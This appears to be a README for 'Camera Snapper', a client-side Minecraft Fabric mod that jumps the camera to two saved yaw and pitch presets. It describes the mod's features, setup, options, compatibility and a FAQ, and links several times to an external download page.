# Camera Snapper - Minecraft Camera Utility 2026

> **A client-side Minecraft Fabric mod that lets you reposition the camera instantly using saved yaw and pitch presets.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/erikjung2/camera-snapper-preset-hub?style=flat-square)](https://github.com/erikjung2/camera-snapper-preset-hub)

---

<p align="center">
  <a href="https://erikjung2.github.io/camera-snapper-preset-hub/">
    <img src="https://img.shields.io/badge/Download-Camera%20Snapper%20Mod-brightgreen?style=for-the-badge" alt="Download Camera Snapper Mod">
  </a>
</p>

> **[Download - Camera Snapper](https://erikjung2.github.io/camera-snapper-preset-hub/)**

---

[Download Latest Build](https://erikjung2.github.io/camera-snapper-preset-hub/)

---

## Overview

Camera Snapper is a Fabric mod that runs on the client and gives you a fast, repeatable way to aim the camera. Bind a key, and your view jumps straight to a yaw and pitch pair you saved earlier - handy whenever you need to get back to a particular angle without dragging the mouse around.

Two camera presets are available and you can switch between them at any time. You can also grab whatever direction you are currently facing and store it as a preset, and the mod shows a short on-screen message each time a preset is applied. Saved values carry over between sessions, and a built-in settings screen plus ModMenu integration make configuration and key remapping easy to reach.

---

## Script Features

- Move the camera directly to a stored yaw and pitch orientation.
- Keep two camera presets and toggle between them.
- Apply any preset with one keybind you define yourself.
- Save your current camera orientation for reuse.
- Get visible confirmation whenever the active preset changes.
- Remap the controls to keys of your choosing.
- Presets are saved and remain available after restarting.
- Reach the configuration either through the built-in settings screen or via ModMenu.

---

## Setup

1. Grab the newest Camera Snapper build using the download link above.
2. Make sure Fabric Loader and the Fabric environment your setup requires are in place.
3. Drop the downloaded `.jar` file into the Minecraft `mods` folder.
4. Start Minecraft using the Fabric profile.
5. Open the mod settings from ModMenu if you have it installed, or use the in-game configuration screen that the mod provides.
6. Bind a key, set up your presets, and press the key to snap the camera into place.

Camera Snapper is built to run client-side. The camera controls do not need any server-side installation.

---

## Options

| Option | Purpose |
| --- | --- |
| Preset 1 | Holds a single yaw and pitch camera orientation. |
| Preset 2 | Holds a second yaw and pitch camera orientation. |
| Camera snap keybind | Applies the currently selected camera preset. |
| Preset selection | Picks which saved camera orientation is active. |
| Capture current view | Saves the camera's present orientation as a preset. |
| Keybind assignments | Lets you swap the default keys for your preferred ones. |
| On-screen confirmation | Shows a message when a preset has been applied. |

To update a preset, aim the camera where you want it, capture the current view, and save the configuration through the mod settings.

---

## Compatibility

- **Game:** Minecraft
- **Loader:** Fabric
- **Environment:** Client-side
- **Integration:** ModMenu support
- **Camera data:** Yaw and pitch presets
- **Preset capacity:** Two switchable camera presets

Which Minecraft versions are supported depends on the individual build. Look over the release details before installing, and pick a build that fits your Fabric setup. Server-side behavior is not covered by this client-side camera utility.

---

## FAQ

### How do I install Camera Snapper?

Download the mod file, then put it in the `mods` folder that your Fabric Minecraft profile uses. Launch the game with Fabric enabled.

### How do I activate a preset?

In the settings, bind the camera snap action to a key, choose a preset, and press that key while playing.

### Can I change the controls?

Yes. Camera Snapper ships with rebindable controls, so you can pick different keys for snapping and the related actions.

### How do I create a preset?

Aim the camera in the direction you want, use the capture current view option, and store that orientation in one of the available preset slots.

### Are presets retained after restarting Minecraft?

Preset data is meant to persist across sessions. If the values do not show up, check the active instance and its configuration directory.

### Does the mod work on servers?

Camera Snapper is client-side. The camera controls are handled by your local Minecraft client, so whether it works on a given server can depend on that server's rules and environment.

### How do I access the settings screen?

Use ModMenu if it is installed, or open the mod's in-game settings screen through the Fabric client configuration flow.

### Where can I get updates?

Check the [latest build download](https://erikjung2.github.io/camera-snapper-preset-hub/) for updated releases, and choose the file that matches your Minecraft and Fabric configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
